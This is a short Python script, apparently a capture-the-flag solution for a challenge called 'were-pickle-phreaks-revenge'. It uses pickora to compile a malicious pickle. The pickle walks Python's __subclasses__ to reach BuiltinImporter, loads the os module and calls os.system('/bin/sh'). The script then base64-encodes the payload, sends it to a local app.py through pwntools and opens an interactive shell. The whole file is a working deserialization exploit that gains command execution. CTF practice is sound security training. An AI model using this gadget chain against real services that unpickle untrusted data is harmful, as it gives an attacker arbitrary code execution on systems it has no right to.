#!/usr/bin/env python3

from pickora import Compiler
from base64 import b64encode
import pwn

p = b'_setattr = GLOBAL("app", "__setattr__");'
p += b'subclasses = GLOBAL("app", "Phreaks.__class__.__base__.__subclasses__")();'
p += b'_setattr("subclasses", subclasses);'
p += b'gadget = GLOBAL("app", "subclasses.__getitem__")(107);'  # <class '_frozen_importlib.BuiltinImporter'>
p += b'_setattr("gadget", gadget);'
p += b'os = GLOBAL("app", "gadget.load_module")("os");'
p += b'_setattr("os", os);'
p += b'system = GLOBAL("app", "os.system")("/bin/sh");'

pwn.log.info(f"p: {p}")

if __name__ == '__main__':

    payload = b64encode(Compiler().compile(p))

    pwn.log.info(f"Payload: {payload}")

    io  = pwn.process(['python3', 'misc-were-pickle-phreaks-revenge/app.py'])
    sla = lambda x, y : io.sendlineafter(x, y)

    sla(b'> ', b'2')
    sla(b'data: ', payload)
    sla(b'> ', b'1')
    io.interactive()
